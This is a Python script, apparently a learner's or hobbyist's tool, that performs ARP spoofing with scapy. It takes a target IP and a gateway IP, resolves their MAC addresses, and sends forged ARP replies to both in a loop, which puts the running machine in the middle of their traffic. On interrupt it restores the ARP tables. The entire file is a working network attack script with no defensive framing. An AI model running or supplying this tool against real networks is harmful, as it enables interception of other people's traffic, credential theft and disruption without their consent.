#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse

def get_arguments():

    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="set the target ip")
    parser.add_argument("-s","--spoof",dest="spoof",help="set the spoof ip")
    options=parser.parse_args()
    if not options.target:
        parser.error("[-] pls specify  the target_ip ,use --help for more info ")
    elif not options.spoof:
        parser.error("[-] pls specify  the spoof_ip address  ,use --help for more info ")
    return options

def get_mac(t_ip):
    arp_request = scapy.ARP(pdst=t_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_brodcast = broadcast / arp_request
    answer = scapy.srp(arp_request_brodcast, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(response,verbose=False)
def restore(des_ip,source_ip):
    d_mac = get_mac(des_ip)
    s_mac = get_mac(source_ip)
    respon = scapy.ARP(op=2,pdst=des_ip,hwdst=d_mac,psrc=source_ip,hwsrc=s_mac)
    scapy.send(respon,verbose=False)
get_options = get_arguments()
target_ip = get_options.target
gateway_ip = get_options.spoof
count_print = 0
try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        count_print+=2
        print("\r[+]packets sent: " + str(count_print),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Ctrl + C press programme quiting......... and restore the ip table")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)